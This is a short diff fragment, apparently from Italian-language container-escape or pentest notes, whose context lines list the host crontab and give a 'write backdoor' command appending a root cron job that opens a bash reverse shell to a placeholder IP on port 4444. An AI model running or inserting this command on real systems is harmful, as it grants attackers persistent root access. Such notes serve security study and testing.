@@ -161,3 +161,4 @@
         - `/host_etc/crontab`
     - scrivere backdoor:
         `echo "* * * * * root /bin/bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /host_etc/crontab`
+    
